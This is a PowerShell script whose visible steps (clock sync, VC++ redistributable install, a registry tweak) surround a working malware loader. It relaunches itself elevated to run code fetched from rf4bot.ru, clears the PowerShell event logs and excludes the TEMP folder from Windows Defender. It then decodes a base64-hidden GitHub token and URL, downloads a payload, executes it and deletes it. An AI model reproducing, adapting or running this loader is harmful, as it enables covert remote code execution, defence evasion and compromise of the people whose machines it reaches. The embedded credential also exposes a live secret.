function Ensure-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        $scriptPath = $MyInvocation.MyCommand.Definition
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru/nemo)`""

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas"

        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Error: Failed to start with administrator privileges."
            Exit 1
        }
    }
}

# Создаем глобальную переменную для отслеживания ошибок
$global:hadErrors = $false

# Переопределяем функцию Write-Error для установки флага ошибки
function Global:Write-Error {
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Message
    )
    $global:hadErrors = $true
    Microsoft.PowerShell.Utility\Write-Error $Message
}

Function Sync-LocalTime {
    param(
        [Parameter(Mandatory=$false)]
        [string]$NtpServer = "time.windows.com"
    )

    try {
        w32tm /config /manualpeerlist:"$NtpServer" /syncfromflags:MANUAL /update
    }
    catch {
        Write-Error "Error: Failed to configure time service. $($_.Exception.Message)"
    }

    try {
        Stop-Service w32time -ErrorAction Stop
        Start-Service w32time -ErrorAction Stop
    }
    catch {
        Write-Error "Error: Failed to restart time service. $($_.Exception.Message)"
    }

    try {
        w32tm /resync /force
    }
    catch {
        Write-Error "Error: Failed to force time resync. $($_.Exception.Message)"
    }
}

cls
Ensure-RunAsAdmin
Sync-LocalTime -NtpServer "time.windows.com"
cls
function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
    } catch {
        Write-Error "Error: Failed to set registry value. $($_.Exception.Message)"
    }
}

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Error "Error: Failed to clear event logs. $($_.Exception.Message)"
}

$temp = $env:TEMP

$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try	{
	if (!$redistCheck)
	{
		$redistFilePath = "$temp\VC_redist.x64.exe"
		try
		{
			Remove-Item $redistFilePath -ErrorAction Ignore;
		}
		catch {
            Write-Error "Error: Failed to remove existing redistributable file. $($_.Exception.Message)"
        }
		try
		{
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to download VC++ redistributable. $($_.Exception.Message)"
		}
		try
		{
			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
			Remove-Item $redistFilePath -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to install VC++ redistributable. $($_.Exception.Message)"
		}
	}

    $contFile = [System.IO.Path]::GetTempFileName()
	try { 
        # Проверка наличия модуля Windows Defender перед использованием
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
        } else {
            Write-Host "Windows Defender module not available - skipping exclusion" -ForegroundColor Yellow
        }
    } catch {
        Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
    }

    try {		
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGVlSUViUWhPTkZsUF81aWFPeXBLV3ZCR3BLU3NPa1FPSnRLU3RBYng5bmJHVkdtQW5FY2xBNmJHT0gyMkZZRElHTDlqdnVHRw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
        $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9fL2NvbnRlbnRzL19f"
        $Url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
		$q = '"'
		$h = @{
			"Authorization"  = "$String"
			"Cache-Control"  = "no-cache"
		}
        $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile 
        if (Test-Path $contFile) {
			try {
				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`""
			} catch {
				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
				Start-Sleep -s 3
			}
        } else {
            Write-Error "Error: Downloaded file does not exist at expected location."
            Start-Sleep -s 3
        }
    } catch {
        Write-Error "Error: Failed to download or process the file. $($_.Exception.Message)"
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
}

# Проверяем, были ли ошибки, и если да, то ждем нажатия клавиши
if ($global:hadErrors) {
    Write-Host "`nErrors were encountered during script execution." -ForegroundColor Red
    Write-Host "Press any key to exit..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
# Убираем команду exit для удержания консоли открытой при ручном запуске
